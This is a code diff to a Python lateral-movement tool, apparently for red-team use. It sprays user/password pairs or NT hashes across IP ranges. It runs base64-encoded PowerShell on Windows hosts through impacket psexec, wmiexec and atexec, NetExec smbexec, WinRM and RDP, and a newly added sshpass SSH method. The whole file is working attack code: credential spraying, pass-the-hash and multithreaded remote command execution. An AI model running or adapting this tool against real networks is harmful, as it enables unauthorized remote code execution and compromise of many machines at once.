@@ -1,3 +1,4 @@
+```py
 #!/usr/bin/env python3
 import subprocess
 import base64
@@ -5,7 +6,6 @@ import sys
 from concurrent.futures import ThreadPoolExecutor, as_completed
 import threading
 import argparse
-import re
 
 EXEC_TIMEOUT = 15
 RDP_TIMEOUT = 45
@@ -14,7 +14,8 @@ MAX_THREADS = 10
 VERBOSE = False
 OUTPUT = False
 
-VALID_TOOLS = ["psexec", "winrm", "wmiexec", "atexec", "smbexec", "rdp"]
+VALID_TOOLS = ["psexec", "winrm", "ssh", "wmiexec", "atexec", "smbexec", "rdp"]
+NXC_TOOLS = ["winrm", "smbexec", "rdp"]
 
 print_lock = threading.Lock()
 
@@ -28,17 +29,14 @@ def vprint(msg):
         with print_lock:
             print(colorize(msg))
 
-
 def oprint(msg):
     if OUTPUT:
         with print_lock:
             print(colorize(msg))
 
-
 def safe_print(msg):
     with print_lock:
         print(colorize(msg))
-
 
 def parse_ip_range(ip_range):
     parts = ip_range.split('.')
@@ -62,7 +60,6 @@ def parse_ip_range(ip_range):
             for c in expanded[2]
             for d in expanded[3]]
 
-
 def is_nthash(credential):
     cred = credential.lstrip(':').replace("'", "")
     if len(cred) == 32:
@@ -72,7 +69,6 @@ def is_nthash(credential):
         except ValueError:
             return False
     return False
-
 
 def escape_quotes(pw):
     out = []
@@ -92,12 +88,10 @@ def escape_quotes(pw):
         out.append(f"'{current}'")
     return "".join(out)
 
-
 def quote_if_needed(value):
     if "'" in value:
         return escape_quotes(value)
     return "'" + value + "'"
-
 
 def load_credential_file(path):
     """
@@ -119,23 +113,21 @@ def load_credential_file(path):
         sys.exit(1)
     creds = []
     
-    # Filter out blank lines and comments, preserving order
     filtered = []
     for line in lines:
         stripped = line.strip()
         if stripped and not stripped.startswith("#"):
-            filtered.append(line)  # Keep original (preserve leading/trailing spaces in passwords)
+            filtered.append(line)
     
     if len(filtered) % 2 != 0:
         raise SystemExit(f"Credential file has odd number of lines ({len(filtered)}). Expected pairs of user/password.")
     
     for i in range(0, len(filtered), 2):
         user = filtered[i].strip()
-        cred = filtered[i + 1]  # Don't strip password - might have intentional spaces
+        cred = filtered[i + 1]
         creds.append((user, cred))
     
     return creds
-
 
 def normalize_tool_name(name):
     """Normalize tool name aliases to canonical form."""
@@ -143,7 +135,6 @@ def normalize_tool_name(name):
     if name in ("evilwinrm", "evil-winrm"):
         return "winrm"
     return name
-
 
 def parse_tools_list(tools_str):
     """Parse comma-separated list of tools, validating each one."""
@@ -153,55 +144,67 @@ def parse_tools_list(tools_str):
         if normalized not in VALID_TOOLS:
             print(f"Error: Invalid tool '{t}'. Valid options: {', '.join(VALID_TOOLS)}")
             sys.exit(1)
-        if normalized not in tools:  # Avoid duplicates
+        if normalized not in tools:
             tools.append(normalized)
     return tools
 
-
-def build_cmd(tool, user, target, credential, command):
+def build_cmd(tool, user, target, credential, command, show_output=False):
     b64 = base64.b64encode(command.encode("utf-16le")).decode()
     use_hash = is_nthash(credential)
     hash_val = credential.lstrip(':')
+    
+    # For nxc tools, add --no-output unless -o was passed
+    nxc_output_flag = "" if show_output else " --no-output"
 
     if tool == "psexec":
-        return (f"impacket-psexec -hashes :{hash_val} {user}@{target} 'powershell -enc {b64}'"
+        cmd = impacket_cmd("psexec")
+        return (f"{cmd} -hashes :{hash_val} {user}@{target} 'powershell -enc {b64}'"
                 if use_hash else
-                f"impacket-psexec {user}:{credential}@{target} 'powershell -enc {b64}'")
+                f"{cmd} {user}:{credential}@{target} 'powershell -enc {b64}'")
 
     if tool == "wmiexec":
-        return (f"impacket-wmiexec -hashes :{hash_val} {user}@{target} 'powershell -enc {b64}'"
+        cmd = impacket_cmd("wmiexec")
+        return (f"{cmd} -hashes :{hash_val} {user}@{target} 'powershell -enc {b64}'"
                 if use_hash else
-                f"impacket-wmiexec {user}:{credential}@{target} 'powershell -enc {b64}'")
+                f"{cmd} {user}:{credential}@{target} 'powershell -enc {b64}'")
+
+    if tool == "ssh":
+        return f"sshpass -p {credential} ssh -o StrictHostKeyChecking=no {user}@{target} 'powershell -enc {b64}'"
 
     if tool == "atexec":
-        return (f"impacket-atexec -hashes :{hash_val} {user}@{target} 'powershell -enc {b64}'"
+        cmd = impacket_cmd("atexec")
+        return (f"{cmd} -hashes :{hash_val} {user}@{target} 'powershell -enc {b64}'"
                 if use_hash else
-                f"impacket-atexec {user}:{credential}@{target} 'powershell -enc {b64}'")
+                f"{cmd} {user}:{credential}@{target} 'powershell -enc {b64}'")
 
     if tool == "smbexec":
-        return (f"nxc smb {target} -H {hash_val} -u {user} -X 'powershell -enc {b64}' --exec-method smbexec"
+        return (f"nxc smb {target} -H {hash_val} -u {user} -X 'powershell -enc {b64}' --exec-method smbexec{nxc_output_flag}"
                 if use_hash else
-                f"nxc smb {target} -p {credential} -u {user} -X 'powershell -enc {b64}' --exec-method smbexec")
+                f"nxc smb {target} -p {credential} -u {user} -X 'powershell -enc {b64}' --exec-method smbexec{nxc_output_flag}")
 
     if tool == "winrm":
-        return (f"echo 'powershell -enc {b64}' | evil-winrm -i {target} -u {user} -H {hash_val}"
+        return (f"nxc winrm {target} -H {hash_val} -u {user} -X 'powershell -enc {b64}'{nxc_output_flag}"
                 if use_hash else
-                f"echo 'powershell -enc {b64}' | evil-winrm -i {target} -u {user} -p {credential}")
+                f"nxc winrm {target} -p {credential} -u {user} -X 'powershell -enc {b64}'{nxc_output_flag}")
 
     if tool == "rdp":
-        return (f"echo 'y' | nxc rdp {target} -u {user} -H {hash_val} -X 'powershell -enc {b64}'"
+        return (f"echo 'y' | nxc rdp {target} -u {user} -H {hash_val} -X 'powershell -enc {b64}'{nxc_output_flag}"
                 if use_hash else
-                f"echo 'y' | nxc rdp {target} -u {user} -p {credential} -X 'powershell -enc {b64}'")
+                f"echo 'y' | nxc rdp {target} -u {user} -p {credential} -X 'powershell -enc {b64}'{nxc_output_flag}")
 
     raise Exception(f"Unknown tool: {tool}")
 
-
-def run_chain(user, ip, credential, command, tool_list=None):
-    chain = tool_list if tool_list else ["psexec", "winrm", "wmiexec", "atexec", "smbexec", "rdp"]
+def run_chain(user, ip, credential, command, tool_list=None, show_output=False):
+    chain = tool_list if tool_list else ["psexec", "winrm", "ssh", "wmiexec", "atexec", "smbexec", "rdp"]
 
     for tool in chain:
-        cmd = build_cmd(tool, user, ip, credential, command)
-        safe_print(f"  [i] Trying {tool}: {cmd}")
+        # Can't pass the hash with SSH
+        if tool == "ssh" and is_nthash(credential):
+            safe_print(f"  [-] Skipping SSH for {ip}: cannot pass the hash.")
+            continue
+
+        cmd = build_cmd(tool, user, ip, credential, command, show_output)
+        safe_print(f"[i] Trying {tool}: {cmd}")
 
         try:
             timeout = RDP_TIMEOUT if tool == "rdp" else EXEC_TIMEOUT
@@ -215,71 +218,47 @@ def run_chain(user, ip, credential, command, tool_list=None):
                 vprint(out)
 
         except subprocess.TimeoutExpired:
-            safe_print(f"[-] For {ip}: {tool} timed out.")
+            safe_print(f"  [-] For {ip}: {tool} timed out.")
             continue
 
-        if tool == "psexec" and "[-] share 'SYSVOL' is not writable." in out:
-            safe_print(f"[-] For {ip}: {tool} timed out.")
+        if tool == "psexec" and not "Found writable share" in out:
+            safe_print(f"  [-] For {ip}: {tool} failed.")
             continue
 
         if (tool == "smbexec" or tool == "atexec") and '[-]' in out:
-            safe_print(f"[-] For {ip}: {tool} failed.")
+            safe_print(f"  [-] For {ip}: {tool} failed.")
             continue
         
         if (tool == "smbexec" or tool == "rdp") and rc == 0 and out == "":
-            safe_print(f"[-] For {ip}: {tool} timed out.")
+            safe_print(f"  [-] For {ip}: {tool} failed.")
             continue
 
         if tool == "rdp":
             if "[-] Clipboard" in out:
-                safe_print(f"[+] For {ip}: {tool} succeeded as {user} with {credential}, but failed to initialize clipboard and run command. Try manually using RDP. ")
+                safe_print(f"  [+] For {ip}: {tool} succeeded as {user} with {credential}, but failed to initialize clipboard and run command. Try manually using RDP.")
             elif "[-]" in out:
-                safe_print(f"[-] For {ip}: {tool} failed.")
+                safe_print(f"  [-] For {ip}: {tool} failed.")
             continue
 
         if rc == 0 or (tool == "winrm" and rc == 1):
-            return tool, out
+            return (tool, out, cmd)
 
-        safe_print(f"[-] For {ip}: {tool} failed.")
+        safe_print(f"  [-] For {ip}: {tool} failed.")
 
     return None
 
-# extract the command result
-# not using because A) somewhat difficult to implement and B) the extra tool output can be helpful, even if it succeeds
-# def extract_between(text, start_marker, end_marker=None):
-#     start_idx = text.find(start_marker)
-#     if start_idx == -1:
-#         return None
+def execute_on_ip(username, ip, credential, command, tool_list=None, show_output=False):
+    safe_print(f"[*] Attempting {username}@{ip}...")
+    result = run_chain(username, ip, credential, command, tool_list, show_output)
 
-#     start_idx += len(start_marker)
-
-#     if end_marker:
-#         end_idx = text.find(end_marker, start_idx)
-#         if end_idx != -1:
-#             return text[start_idx:end_idx].strip()
-
-#     # No end marker supplied or not found
-#     return text[start_idx:].strip()
-
-def execute_on_ip(username, ip, credential, command, tool_list=None):
-    tool, out = run_chain(username, ip, credential, command, tool_list)
-
-    if tool is None:
+    if result is None:
         safe_print(f"[-] All tools failed for {ip} with {username}.")
         return (ip, None)
 
-    safe_print(f"[+] Success on {ip} using {tool} as {username} with {credential}.")
-    if tool == "winrm":
-        start = r"Info: Establishing connection to remote endpoint"
-        end = r"Error: An error of type"
-
-        pattern = rf"{start}(.*?)(?:{end}|$)"
-        m = re.search(pattern, out, re.DOTALL)
-        oprint(m.group(1).strip())
-    else:
-        oprint(out)
+    tool, out, cmd = result
+    safe_print(f"[+] Success! With command: {cmd}")
+    oprint(out)
     return (ip, tool)
-
 
 def print_usage():
     msg = f"""
@@ -311,7 +290,6 @@ Examples:
 """
     print(msg.strip())
 
-# parse arguments
 def parse_args():
     parser = argparse.ArgumentParser(
         description="Execute commands across an IP range using multiple Windows RCE methods",
@@ -324,7 +302,6 @@ def parse_args():
     parser.add_argument("--tools", metavar="LIST", help="Comma-separated list of tools to try")
     parser.add_argument("-f", "--file", metavar="CRED_FILE", help="Credential file (newline-separated user/password pairs)")
 
-    # Positional arguments
     parser.add_argument("ip_range", help="IP range (e.g., 192.168.1.1-254)")
     parser.add_argument("username", nargs="?", help="Username")
     parser.add_argument("credential", nargs="?", help="Password or NT hash")
@@ -332,7 +309,6 @@ def parse_args():
 
     args = parser.parse_args()
 
-    # Validate credential modes
     if args.file and (args.username or args.credential):
         parser.error("Cannot specify username/password when using -f")
 
@@ -341,9 +317,39 @@ def parse_args():
 
     return args
 
+IMPACKET_PREFIX = "impacket-"  # or "" for .py suffix
+
+def check_dependencies():
+    """Check if required tools are installed."""
+    global IMPACKET_PREFIX
+    
+    # Check nxc
+    result = subprocess.run("nxc -h", shell=True, capture_output=True)
+    if result.returncode != 0:
+        print("[-] nxc not found. Install with: pipx install netexec")
+        sys.exit(1)
+    
+    # Check impacket (either impacket-psexec or psexec.py)
+    r1 = subprocess.run("impacket-psexec --help", shell=True, capture_output=True)
+    r2 = subprocess.run("psexec.py --help", shell=True, capture_output=True)
+    if r1.returncode == 0:
+        IMPACKET_PREFIX = "impacket-"
+    elif r2.returncode == 0:
+        IMPACKET_PREFIX = ""
+    else:
+        print("[-] impacket not found. Install with: pipx install impacket")
+        sys.exit(1)
+
+def impacket_cmd(tool):
+    """Return the correct impacket command name based on install type."""
+    if IMPACKET_PREFIX:
+        return f"impacket-{tool}"
+    return f"{tool}.py"
 
 def main():
     global VERBOSE, OUTPUT, MAX_THREADS
+
+    check_dependencies()
 
     args = parse_args()
 
@@ -351,13 +357,15 @@ def main():
     OUTPUT = args.o
     MAX_THREADS = args.threads
 
+    if not OUTPUT:
+        print("[*] Run with -o to see successful command output")
+
     if args.tools:
         tool_list = parse_tools_list(args.tools)
         print(f"[*] Using tools: {', '.join(tool_list)}")
     else:
         tool_list = None
 
-    # Credential handling
     if args.file:
         credential_list = load_credential_file(args.file)
         command = " ".join(args.command) if args.command else "whoami"
@@ -365,7 +373,15 @@ def main():
         credential_list = [(args.username, args.credential)]
         command = " ".join(args.command) if args.command else "whoami"
 
-    ips = parse_ip_range(args.ip_range)
+    if args.ip_range.endswith('.txt'):
+        ips = []
+        with open(args.ip_range) as f:
+            for line in f:
+                line = line.strip()
+                if line and not line.startswith('#'):
+                    ips.extend(parse_ip_range(line))
+    else:
+        ips = parse_ip_range(args.ip_range)
 
     print(f"[*] Loaded {len(credential_list)} credential set(s)")
     print(f"[*] Processing {len(ips)} IPs with {MAX_THREADS} threads...")
@@ -382,7 +398,7 @@ def main():
                     c_cred = cred
 
                 futures.append(
-                    executor.submit(execute_on_ip, c_user, ip, c_cred, command, tool_list)
+                    executor.submit(execute_on_ip, c_user, ip, c_cred, command, tool_list, OUTPUT)
                 )
 
         for future in as_completed(futures):
@@ -391,6 +407,6 @@ def main():
             except Exception as e:
                 safe_print(f"[!] Exception: {e}")
 
-
 if __name__ == "__main__":
     main()
+```
